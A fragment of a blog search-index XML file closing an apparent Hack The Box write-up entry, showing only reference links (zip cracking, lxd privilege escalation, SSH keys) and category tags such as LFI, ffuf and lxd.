href="https://pentaroot.com/cracking-encrypted-zip-fcrackzip/">https://pentaroot.com/cracking-encrypted-zip-fcrackzip/</a></p><p>lxd PrivEsc - <a href="https://www.hackingarticles.in/lxd-privilege-escalation/">https://www.hackingarticles.in/lxd-privilege-escalation/</a></p><p>Creación de llaves SSH - <a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-ssh-keys--2">https://www.digitalocean.com/community/tutorials/how-to-set-up-ssh-keys--2</a></p>]]></content>
      
      
      <categories>
          
          <category> HTB </category>
          
          <category> Linux </category>
          
          <category> API Tomcat </category>
          
          <category> LFI </category>
          
          <category> ffuf </category>
          
          <category> fcraczip </category>
          
          <category> lxd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
